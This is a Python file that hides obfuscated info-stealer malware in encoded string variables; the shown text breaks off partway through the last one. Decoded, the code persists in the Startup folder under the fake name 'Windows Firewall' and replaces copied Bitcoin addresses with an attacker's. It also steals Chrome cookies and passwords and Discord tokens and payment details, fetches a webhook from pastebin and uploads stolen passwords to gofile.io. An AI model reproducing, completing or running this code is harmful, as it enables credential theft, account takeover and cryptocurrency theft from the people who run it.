
import base64, codecs
magic = 'aW1wb3J0IG9zDQppZiBvcy5uYW1lID09ICJudCI6DQogICAgcGFzcw0KZWxzZToNCiAgICBleGl0KCkNCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQpmcm9tIHJlIGltcG9ydCBmaW5kYWxsDQpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuDQpmcm9tIHdpbnJlZ2lzdHJ5IGltcG9ydCBXaW5SZWdpc3RyeSBhcyBSZWcNCmZyb20gc3VicHJvY2VzcyBpbXBvcnQgUG9wZW4sIFBJUEUNCmltcG9ydCB3aW4zMmFwaQ0KaW1wb3J0IHdpbjMyY29uDQppbXBvcnQgcmFuZG9tDQpmcm9tIFBJTCBpbXBvcnQgSW1hZ2VHcmFiDQppbXBvcnQgY3R5cGVzDQppbXBvcnQgc3lzDQppbXBvcnQgZ2V0cGFzcw0KaW1wb3J0IHJlDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBzdWJwcm9jZXNzDQpmcm9tIG9zIGltcG9ydCBlbnZpcm9uLCBwYXRoDQpmcm9tIHdpbjMyY3J5cHQgaW1wb3J0IENyeXB0VW5wcm90ZWN0RGF0YQ0KaW1wb3J0IGpzb24NCmltcG9ydCBiYXNlNjQNCmltcG9ydCBzcWxpdGUzDQppbXBvcnQgYnJvd3Nlcl9jb29raWUzDQppbXBvcnQgdGltZQ0KaW1wb3J0IGxvZ2dpbmcNCmltcG9ydCB3aW4zMmNyeXB0DQpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUw0KaW1wb3J0IHNodXRpbA0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUsIHRpbWVkZWx0YQ0KZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGRlY29kZQ0KDQojIENvbmZpZ3VyYXRpb24NCkJUQ19BRERSRVNTID0gJzNMc1pIN0xxeEpNWkJhVlU5WW9UTGs4SE5uVWNtekU4OHYnDQpwYXN0ZWJpbiA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvUEJ1N0hpVXEiDQpoaWRkZW5XaW5kb3cgPSBUcnVlDQpGYWtlRmlsZU5hbWUgPSAiV2luZG93cyBGaXJld2FsbCINCg0KIyBEZWZpbmluZyBuZWVkZWQgdmFyaWFibGVzDQp3ZWJob29rVVJMID0gcmVxdWVzdHMuZ2V0KHBhc3RlYmluKS50ZXh0DQpwYXRoID0gcGF0aC5qb2luKA0KICAgIGVudmlyb25bIlVTRVJQUk9GSUxFIl0sDQogICAgIkFwcERhdGEiLA0KICAgICJMb2NhbCIsDQogICAgIkdvb2dsZSIsDQogICAgIkNocm9tZSIsDQogICAgIlVzZXIgRGF0YSIsDQogICAgIkRlZmF1bHQiLA0KICAgICJMb2dpbiBEYXRhIiwNCikNCm15bmFtZSA9IHN0cihzeXMuYXJndlswXSkNClVTRVJfTkFNRSA9IGdldHBhc3MuZ2V0dXNlcigpDQpMT0NBTCA9IG9zLmdldGVudigiTE9DQUxBUFBEQVRBIikNClJPQU1JTkcgPSBvcy5nZXRlbnYoIkFQUERBVEEiKQ0KUEFUSFMgPSB7DQogICAgIkRpc2NvcmQiICAgICAgICAgICA6IFJPQU1JTkcgKyAiXFxEaXNjb3JkIiwNCiAgICAiRGlzY29yZCBDYW5hcnkiICAgIDogUk9BTUlORyArICJcXGRpc2NvcmRjYW5hcnkiLA0KICAgICJEaXNjb3JkIFBUQiIgICAgICAgOiBST0FNSU5HICsgIlxcZGlzY29yZHB0YiIsDQogICAgIkdvb2dsZSBDaHJvbWUiICAgICA6IExPQ0FMICsgIlxcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCIsDQogICAgIkJyYXZlIiAgICAgICAgICAgICA6IExPQ0FMICsgIlxcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0IiwNCiAgICAiWWFuZGV4IiAgICAgICAgICAgIDogTE9DQUwgKyAiXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCINCn0NCg0KY2xhc3MgQ2xpcGJvYXJkOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5rZXJuZWwzMiA9IGN0eXBlcy53aW5kbGwua2VybmVsMzINCiAgICAgICAgc2VsZi5rZXJuZWwzMi5HbG9iYWxMb2NrLmFyZ3R5cGVzID0gW2N0eXBlcy5jX3ZvaWRfcF0NCiAgICAgICAgc2VsZi5rZXJuZWwzMi5HbG9iYWxMb2NrLnJlc3R5cGUgPSBjdHlwZXMuY192b2lkX3ANCiAgICAgICAgc2VsZi5rZXJuZWwzMi5HbG9iYWxVbmxvY2suYXJndHlwZXMgPSBbY3R5cGVzLmNfdm9pZF9wXQ0KDQogICAgICAgIHNlbGYudXNlcjMyID0gY3R5cGVzLndpbmRsbC51c2VyMzINCiAgICAgICAgc2VsZi51c2VyMzIuR2V0Q2xpcGJvYXJkRGF0YS5yZXN0eXBlID0gY3R5cGVzLmNfdm9pZF9wDQoNCiAgICBkZWYgX19lbnRlcl9fKHNlbGYpOg0KICAgICAgICBzZWxmLnVzZXIzMi5PcGVuQ2xpcGJvYXJkKDApDQogICAgICAgIGlmIHNlbGYudXNlcjMyLklzQ2xpcGJvYXJkRm9ybWF0QXZhaWxhYmxlKDEpOg0KICAgICAgICAgICAgZGF0YSAgPSBzZWxmLnVzZXIzMi5HZXRDbGlwYm9hcmREYXRhKDEpDQogICAgICAgICAgICBkYXRhX2xvY2tlZCA9IHNlbGYua2VybmVsMzIuR2xvYmFsTG9jayhkYXRhKQ0KICAgICAgICAgICAgdGV4dCA9IGN0eXBlcy5jX2NoYXJfcChkYXRhX2xvY2tlZCkNCiAgICAgICAgICAgIHZhbHVlID0gdGV4dC52YWx1ZQ0KICAgICAgICAgICAgc2VsZi5rZXJuZWwzMi5HbG9iYWxVbmxvY2soZGF0YV9sb2NrZWQpDQoNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICByZXR1cm4gdmFsdWUuZGVjb2RlKCkNCg0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgIHJldHVybiAnJw0KDQogICAgZGVmIF9fZXhpdF9fKHNlbGYsIGV4Y190eXBlLCBleGNfdmFsdWUsIGV4Y190cmFjZWJhY2spOg0KICAgICAgICBzZWxmLnVzZXIzMi5DbG9zZUNsaXBib2FyZCgpDQoNCmNsYXNzIE1ldGhvZHM6DQogICAgcmVnZXggPSAnXihiYzF8WzEzXSlbYS16QS1ISi1OUC1aMC05XSsnDQoNCiAgICBAc3RhdGljbWV0aG9kDQogICAgZGVmIHNldF9jbGlwYm9hcmQodGV4dCk6DQogICAgICAgIHJldHVybiBzdWJwcm9jZXNzLmNoZWNrX2NhbGwoJ2VjaG8gJXMgfGNsaXAnICUgdGV4dC5zdHJpcCgpICwgc2hlbGw9VHJ1ZSkNCg0KICAgIGRlZiBjaGVjayhzZWxmLCB0ZXh0KToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgcmVnZXhfY2hlY2sgPSByZS5maW5kYWxsKHNlbGYucmVnZXgsIHRleHQpDQogICAgICAgICAgICBpZiByZWdleF9jaGVjazoNCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCg0KY2xhc3MgTG9nZ2VyKCk6DQogICAgZGVmIHN0YXJ0dXAoKToNCiAgICAgICAgaWYgIi5weSIgaW4gbXluYW1lOg0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKG15bmFtZSwgZnInQzpcVXNlcnNcJXNcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFx7RmFrZUZpbGVOYW1lfS5leGUnICUgVVNFUl9OQU1FKQ0KICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG15bmFtZQ0KICAgICAgICAgICAgICAgIGlmIGZpbGVfcGF0aCA9PSAiIjoNCiAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGgucmVhbHBhdGgoX19maWxlX18pKQ0KICAgICAgICAgICAgICAgIGJhdF9wYXRoID0gcidDOlxVc2Vyc1wlc1xBcHBEYXRhXFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwJyAlIFVTRVJfTkFNRQ0KICAgICAgICAgICAgICAgIHdpdGggb3BlbihiYXRfcGF0aCArICdcXCcgKyBmIntGYWtlRmlsZU5hbWV9LmJhdCIsICJ3KyIpIGFzIGJhdF9maWxlOg0KICAgICAgICAgICAgICAgICAgICBiYXRfZmlsZS53cml0ZShyJ3N0YXJ0ICIiICVzJyAlIGZpbGVfcGF0aCkNCiAgICAgICAgICAgICAgICAgICAgd2luMzJhcGkuU2V0RmlsZUF0dHJpYnV0ZXMoZiJ7RmFrZUZpbGVOYW1lfS5iYXQiLCB3aW4zMmNvbi5GSUxFX0FUVFJJQlVURV9ISURERU4pDQogICAgICAgICAgICAgICAgICAgIGJhdF9maWxlLmNsb3NlKCkNCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICBwcmludChlKQ0KICAgIGRlZiBjb29raWVMb2coKToNCiAgICAgICAgY29va2llcyA9IGxpc3QoYnJvd3Nlcl9jb29raWUzLmNocm9tZSgpKQ0KICAgICAgICBmID0gb3BlbigicmMudHh0IiwidysiKQ0KICAgICAgICB3aW4zMmFwaS5TZXRGaWxlQXR0cmlidXRlcygicmMudHh0Iiwgd2luMzJjb24uRklMRV9BVFRSSUJVVEVfSElEREVOKQ0KICAgICAgICBmb3IgaXRlbSBpbiBjb29raWVzOg0KICAgICAgICAgICAgICAgIGYud3JpdGUoIiVzXG4iICUgaXRlbSkNCiAgICBkZWYgcGFzc3dvcmRMb2coKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZGVmIGdldF9tYXN0ZXJfa2V5KCk6DQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10gKyBvcy5zZXAgKyByJ0FwcERhdGFcTG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcTG9jYWwgU3RhdGUnLCAiciIsIGVuY'
love = '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'
god = 'AgICAgICAgIHByaW50KGUpDQogICAgICAgICAgICBjb29raWVzVXBsb2FkZWQgPSAiQ29va2llczogTi9BIg0KDQogICAgICAgICMgUGFzc3dvcmRzDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHBhc3N3b3Jkc1JhdyA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vc3RvcmU5LmdvZmlsZS5pby91cGxvYWRGaWxlJywgZmlsZXM9eydmaWxlJzogKCd4dmMudHh0Jywgb3BlbigneHZjLnR4dCcsICdyYicpKSx9KS50ZXh0DQogICAgICAgICAgICBwYXNzd29yZHNVcGxvYWRlZCA9IGYiW1Bhc3N3b3Jkc10oe3Bhc3N3b3Jkc1Jhd1szOTo2NV19KSINCiAgICAgICAgICAgIG9zLnJlbW92ZSgieHZjLnR4dCIpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHByaW50KGUpDQogICAgICAgICAgICBwYXNzd29yZHNVcGxvYWRlZCA9ICJQYXNzd29yZHM6IE4vQSINCg0KICAgICAgICAjIEZpbmFsaXplIExvZ2dlcg0KICAgICAgICBkZWYgZ2V0aGVhZGVycyh0b2tlbj1Ob25lLCBjb250ZW50X3R5cGU9ImFwcGxpY2F0aW9uL2pzb24iKToNCiAgICAgICAgICAgIGhlYWRlcnMgPSB7DQogICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6IGNvbnRlbnRfdHlwZSwNCiAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4xMSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yMy4wLjEyNzEuNjQgU2FmYXJpLzUzNy4xMSINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIHRva2VuOg0KICAgICAgICAgICAgICAgIGhlYWRlcnMudXBkYXRlKHsiQXV0aG9yaXphdGlvbiI6IHRva2VufSkNCiAgICAgICAgICAgIHJldHVybiBoZWFkZXJzDQogICAgICAgIGRlZiBnZXR1c2VyZGF0YSh0b2tlbik6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcmV0dXJuIGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIiwgaGVhZGVycz1nZXRoZWFkZXJzKHRva2VuKSkpLnJlYWQoKS5kZWNvZGUoKSkNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgIGRlZiBnZXR0b2tlbnMocGF0aCk6DQogICAgICAgICAgICBwYXRoICs9ICJcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGIiDQogICAgICAgICAgICB0b2tlbnMgPSBbXQ0KICAgICAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOg0KICAgICAgICAgICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoIi5sb2ciKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgiLmxkYiIpOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmIntwYXRofVxce2ZpbGVfbmFtZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyN30iLCByIm1mYVwuW1x3LV17ODR9Iik6DQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gZmluZGFsbChyZWdleCwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW5zLmFwcGVuZCh0b2tlbikNCiAgICAgICAgICAgIHJldHVybiB0b2tlbnMNCiAgICAgICAgZGVmIGdldGlwKCk6DQogICAgICAgICAgICBpcCA9ICJOb25lIg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGlwID0gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICByZXR1cm4gaXANCiAgICAgICAgZGVmIGdldGF2YXRhcih1aWQsIGFpZCk6DQogICAgICAgICAgICB1cmwgPSBmImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve3VpZH0ve2FpZH0uZ2lmIg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHVybG9wZW4oUmVxdWVzdCh1cmwpKQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIHVybCA9IHVybFs6LTRdDQogICAgICAgICAgICByZXR1cm4gdXJsDQogICAgICAgIGRlZiBnZXRod2lkKCk6DQogICAgICAgICAgICBwID0gUG9wZW4oIndtaWMgY3Nwcm9kdWN0IGdldCB1dWlkIiwgc2hlbGw9VHJ1ZSwgc3RkaW49UElQRSwgc3Rkb3V0PVBJUEUsIHN0ZGVycj1QSVBFKQ0KICAgICAgICAgICAgcmV0dXJuIChwLnN0ZG91dC5yZWFkKCkgKyBwLnN0ZGVyci5yZWFkKCkpLmRlY29kZSgpLnNwbGl0KCJcbiIpWzFdDQogICAgICAgIGRlZiBnZXRmcmllbmRzKHRva2VuKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICByZXR1cm4gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUvcmVsYXRpb25zaGlwcyIsIGhlYWRlcnM9Z2V0aGVhZGVycyh0b2tlbikpKS5yZWFkKCkuZGVjb2RlKCkpDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICBkZWYgZ2V0Y2hhdCh0b2tlbiwgdWlkKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICByZXR1cm4gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUvY2hhbm5lbHMiLCBoZWFkZXJzPWdldGhlYWRlcnModG9rZW4pLCBkYXRhPWR1bXBzKHsicmVjaXBpZW50X2lkIjogdWlkfSkuZW5jb2RlKCkpKS5yZWFkKCkuZGVjb2RlKCkpWyJpZCJdDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICBkZWYgaGFzX3BheW1lbnRfbWV0aG9kcyh0b2tlbik6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcmV0dXJuIGJvb2wobGVuKGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1nZXRoZWFkZXJzKHRva2VuKSkpLnJlYWQoKS5kZWNvZGUoKSkpID4gMCkNCiAgICAgI